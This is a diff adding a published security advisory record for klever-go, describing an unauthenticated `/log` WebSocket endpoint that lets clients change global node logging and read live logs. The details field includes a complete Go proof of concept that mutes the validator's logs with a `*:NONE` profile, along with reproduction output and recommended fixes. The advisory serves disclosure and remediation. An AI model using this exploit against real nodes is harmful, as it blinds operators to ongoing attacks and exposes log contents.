@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-9v8p-frvj-2pcm",
+  "modified": "2026-09-23T19:30:05.297737728Z",
+  "published": "2026-09-23T19:13:46Z",
+  "aliases": [
+    "CVE-2026-86064"
+  ],
+  "summary": "Klever-Go: /log controls global node logging",
+  "details": "An unauthenticated client can connect to `GET /log`, send an arbitrary logger profile as the first WebSocket message, and mutate the node's global logging configuration before receiving live logs from the process. I confirmed this against a local validator built from this repository: an unauthenticated client set the global log level to `*:NONE`, the node accepted the profile, and the node stopped emitting normal slot logs while the WebSocket connection remained open.\n\nThis is not a duplicate of the published KVM or P2P advisories. It is a management-plane flaw in the public WebSocket logging endpoint.\n\n## Vulnerability details\n\n### Affected code\n\n- Route exposed by default in `config/node/api.yaml`\n- Route registration in `network/api/api.go`\n- Unauthenticated upgrade in `network/api/api.go`\n- First client message is parsed as a logger profile and applied globally in `network/api/logs/logSender.go`\n- Global logger mutation happens in dependency `github.com/klever-io/klever-go-logger`, `profile.go`, `Apply()`\n\n### Root cause\n\n`/log` is enabled by default and does not require authentication. After the WebSocket upgrade, the server reads the first client message and treats it as a logger `Profile`. That profile is then applied process-wide through `profile.Apply()`, which changes global log level patterns and output formatting options for the whole node.\n\nAfter that handshake, the same unauthenticated connection is registered as a log observer and receives live logs from the running process.\n\n## Reproduction steps\n\n### Environment\n\n- Validator built from the repository at commit `9640d63265e910e166dfa694c8e5ddeb53018ffd`\n- REST API bound locally for validation\n- Tested on 2026-05-30\n\n### Step 1: Build and run a local validator from source\n\n```bash\ncd \u003crepo-root\u003e\n\ngo build -o ./bin/validator ./cmd/node\n\n./bin/validator \\\n  --rest-api-interface=127.0.0.1:18080 \\\n  --port=18083 \\\n  --config=./config/node/config.yaml \\\n  --config-api=./config/node/api.yaml \\\n  --config-epochs=./config/node/enableEpochs.yaml \\\n  --config-gas-schedule=./config/node/gasScheduleV1.yaml \\\n  --config-external=./config/node/external.yaml \\\n  --genesis-file=./config/node/genesis.json \\\n  --nodes-setup-file=./config/node/nodesSetup.json \\\n  --working-directory=./validator-report-run \\\n  --use-log-view\n```\n\nThe node exposes `GET /log` and a plain HTTP request already shows it is a live WebSocket endpoint:\n\n```bash\ncurl -i http://127.0.0.1:18080/log\n```\n\nObserved response:\n\n```http\nHTTP/1.1 400 Bad Request\nSec-Websocket-Version: 13\n```\n\n### Step 2: Confirm normal node logging before the attack\n\nBefore the attack, the validator emits periodic slot logs such as:\n\n```text\n#################################### SLOT 14 BEGINS ####################################\n#################################### SLOT 15 BEGINS ####################################\n```\n\n### Step 3: Connect to `/log` without authentication and apply a global mute profile\n\nRun the PoC file:\n\n```bash\ncd \u003crepo-root\u003e\ngo run ./poc-log-profile-control.go \\\n  -url ws://127.0.0.1:18080/log \\\n  -profile none \\\n  -hold 12s\n```\n\nFull PoC source:\n\n```go\npackage main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"log\"\n\t\"time\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nfunc main() {\n\turl := flag.String(\"url\", \"ws://127.0.0.1:18080/log\", \"WebSocket log endpoint\")\n\tprofile := flag.String(\"profile\", \"none\", \"Profile to send: none or trace\")\n\thold := flag.Duration(\"hold\", 12*time.Second, \"How long to keep the socket open\")\n\tflag.Parse()\n\n\tpayload := `{\"LogLevelPatterns\":\"*:NONE\",\"WithCorrelation\":false,\"WithLoggerName\":false}`\n\tswitch *profile {\n\tcase \"trace\":\n\t\tpayload = `{\"LogLevelPatterns\":\"*:TRACE\",\"WithCorrelation\":true,\"WithLoggerName\":true}`\n\tcase \"none\":\n\tdefault:\n\t\tlog.Fatalf(\"unsupported profile %q\", *profile)\n\t}\n\n\tc, _, err := websocket.DefaultDialer.Dial(*url, nil)\n\tif err != nil {\n\t\tlog.Fatalf(\"dial: %v\", err)\n\t}\n\tdefer c.Close()\n\n\tfmt.Printf(\"connected to %s\\n\", *url)\n\tfmt.Printf(\"sending payload: %s\\n\", payload)\n\n\tif err := c.WriteMessage(websocket.TextMessage, []byte(payload)); err != nil {\n\t\tlog.Fatalf(\"write payload: %v\", err)\n\t}\n\n\tfmt.Printf(\"holding connection open for %s\\n\", hold.String())\n\ttime.Sleep(*hold)\n\tfmt.Println(\"closing connection\")\n}\n```\n\nSave the PoC as `poc-log-profile-control.go` in the repository root, or run it from any directory with access to the Go module cache.\n\n### Step 4: Observe the validator accepts and applies the unauthenticated profile\n\nWhile the PoC is connected, the validator prints:\n\n```text\nwebsocket log profile received  profile = [pattern=*:NONE, with correlation=false, with logger name=false]\n```\n\n### Step 5: Observe logging is suppressed while the attacker connection remains open\n\nIn my local reproduction, the validator emitted:\n\n```text\nSLOT 14 BEGINS\nwebsocket log profile received profile = [pattern=*:NONE, ...]\nreverted log profile profile = [pattern=*:INFO, ...]\nSLOT 18 BEGINS\n```\n\nThe expected slot logs for the interval while `*:NONE` was active did not appear. This proves that an unauthenticated client can suppress process logs globally while the WebSocket remains connected.\n\n### Step 6: Observe the profile is restored only after the attacker disconnects\n\nAfter the PoC closes the WebSocket, the validator prints:\n\n```text\nreverted log profile  profile = [pattern=*:INFO, with correlation=false, with logger name=false]\n```\n\nThe revert happens because the server stores the previous profile and restores it only on disconnect. During the lifetime of the attacker connection, the attacker-controlled profile remains active.\n\n## Impact\n\nAn unauthenticated attacker can:\n\n- read live process logs over `/log`\n- mute node logging completely with `*:NONE`\n- increase verbosity to `*:TRACE` and force noisy logging\n- toggle correlation and logger-name settings process-wide\n\nThis affects both confidentiality and operational integrity.\n\nIn the reproduced case, the attacker hid normal validator slot logs for multiple slot intervals. In real deployments, logs commonly contain operational details, peer information, error traces, and occasionally secrets or credentials emitted by adjacent components. Even when no secrets are present, the ability to suppress or distort logs from the public network is a meaningful security impact because it degrades detection, incident response, and operator visibility while an attacker is active.\n\nThis issue is distinct from:\n\n- `GHSA-jc6w-wmfc-fh33` (KVM read-only execution side effects)\n- `GHSA-87m7-qffr-542v` (MultiDataInterceptor remote OOM)\n- `GHSA-74m6-4hjp-7226` (MultiDataInterceptor throttler slot leak)\n\nThose are VM/P2P-path flaws. This finding is an unauthenticated management-plane flaw in the WebSocket logging endpoint.\n\n## Recommended fix\n\n### Immediate\n\n- Remove `/log` from the default `open: true` route set.\n- Require authentication before upgrading the WebSocket.\n- Reject unauthenticated clients before any profile message is processed.\n\n### Short term\n\n- Do not apply client-provided logger profiles to the process-global logger.\n- If remote log viewing is required, allow only a fixed server-side profile or a strict allowlist of safe settings.\n- Enforce origin checks and, if possible, bind `/log` to localhost-only or a dedicated admin interface.\n\n### Long term\n\n- Separate log streaming from global logger configuration.\n- Move any profile mutation capability behind an authenticated admin-only channel with explicit authorization and audit logging.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/klever-io/klever-go",
+        "purl": "pkg:golang/github.com/klever-io/klever-go"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.7.20"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.7.19",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-9v8p-frvj-2pcm/GHSA-9v8p-frvj-2pcm.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/klever-io/klever-go/security/advisories/GHSA-9v8p-frvj-2pcm"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/klever-io/klever-go/pull/74"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/klever-io/klever-go/commit/a2740c985a788fb69e17742ea4f0c37c440733b2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/klever-io/klever-go"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/klever-io/klever-go/releases/tag/v1.7.20"
+    }
+  ]
+}
